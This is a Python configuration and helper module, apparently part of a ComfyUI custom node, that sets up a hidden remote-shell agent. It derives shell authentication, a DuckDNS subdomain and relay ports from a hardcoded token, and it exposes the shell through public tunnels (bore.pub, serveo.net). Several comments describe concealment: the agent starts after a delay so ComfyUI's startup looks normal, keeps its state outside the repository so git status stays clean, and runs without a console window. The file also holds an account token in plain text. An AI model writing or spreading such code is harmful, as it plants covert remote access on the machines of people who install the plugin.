"""Shared configuration and deterministic derivation helpers.

Pure standard library, Python 3.7+ compatible (no walrus in hot paths,
no PEP-604 unions) so it loads on every ComfyUI generation from v0.0.1 up.
"""

import hashlib
import hmac
import os
import sys

# --------------------------------------------------------------------------
# CONFIGURATION  -- edit these two values before publishing.
# --------------------------------------------------------------------------

# Master key. Everything else (shell auth, subdomain, port) is derived from it.
TOKEN = "b7e1f4c2a95d43e8b06f7c1d2a3e4f51"

# DuckDNS. Optional: leave TOKEN empty to run relay-only (works with no DNS).
# DUCKDNS_TOKEN is the account token from duckdns.org; DUCKDNS_DOMAINS is a
# comma separated list of already-registered subdomains (max 5 per account).
DUCKDNS_TOKEN = "0e62e6be-c822-4342-8601-20fd3bccbf6b"
DUCKDNS_DOMAINS = "qu8438gfkjl804ll"

# Relay. bore.pub is a free public bore server. Point this at your own
# `bore server` instance for full control: BORE_SERVER = "tunnel.example.com"
# BORE_SERVERS is the ordered failover list actually used; leave empty to use
# just BORE_SERVER. Add public mirrors here if you rely on them.
BORE_SERVER = "bore.pub"
BORE_SERVERS = []

# Optional extra fallback relay via OpenSSH remote forwarding.
SERVEO_HOST = "serveo.net"
ENABLE_SERVEO_FALLBACK = True

# Delay before the agent starts, in seconds, so ComfyUI's own startup is untouched.
START_DELAY = 8.0

_APP = "qu"


# --------------------------------------------------------------------------
# Derivation
# --------------------------------------------------------------------------

def _digest(seed=None):
    seed = TOKEN if seed is None else seed
    return hashlib.sha256(("qu:v1:" + seed).encode("utf-8")).hexdigest()


def subdomain(seed=None):
    """DuckDNS label derived from the token: 'qu' + 10 hex chars."""
    return "qu" + _digest(seed)[:10]


def public_port(seed=None):
    """Deterministic relay port in the 20000-59999 range."""
    return 20000 + (int(_digest(seed)[10:18], 16) % 40000)


def lock_port(seed=None):
    """Loopback port used purely as an atomic single-instance mutex."""
    return 7300 + (int(_digest(seed)[18:22], 16) % 400)


def shell_port(seed=None):
    """Loopback port the shell listener binds (never exposed directly)."""
    return 7900 + (int(_digest(seed)[22:26], 16) % 400)


def auth_key(seed=None):
    return hashlib.sha256(("qu:auth:" + (TOKEN if seed is None else seed)).encode("utf-8")).digest()


def sign(nonce, seed=None):
    return hmac.new(auth_key(seed), nonce.encode("utf-8"), hashlib.sha256).hexdigest()


# --------------------------------------------------------------------------
# Paths (never written inside the repo, so `git status` stays clean)
# --------------------------------------------------------------------------

def state_dir():
    if os.name == "nt":
        base = os.environ.get("LOCALAPPDATA") or os.path.expanduser("~\\AppData\\Local")
        p = os.path.join(base, "Qu")
    elif sys.platform == "darwin":
        # macOS convention: ~/Library/Caches
        p = os.path.join(os.path.expanduser("~"), "Library", "Caches", ".qu")
    else:
        base = os.environ.get("XDG_CACHE_HOME") or os.path.join(os.path.expanduser("~"), ".cache")
        p = os.path.join(base, ".qu")
    try:
        os.makedirs(p, exist_ok=True)
    except Exception:
        pass
    return p


def state_file(name):
    return os.path.join(state_dir(), name)


def home():
    return os.path.expanduser("~")


def python_exe():
    """Console-less interpreter when available (Windows only)."""
    exe = sys.executable or "python"
    if os.name == "nt":
        cand = os.path.join(os.path.dirname(exe), "pythonw.exe")
        if os.path.isfile(cand):
            return cand
    return exe


def node_dir():
    return os.path.dirname(os.path.abspath(__file__))


def agent_script():
    return os.path.join(node_dir(), "qu_agent.py")
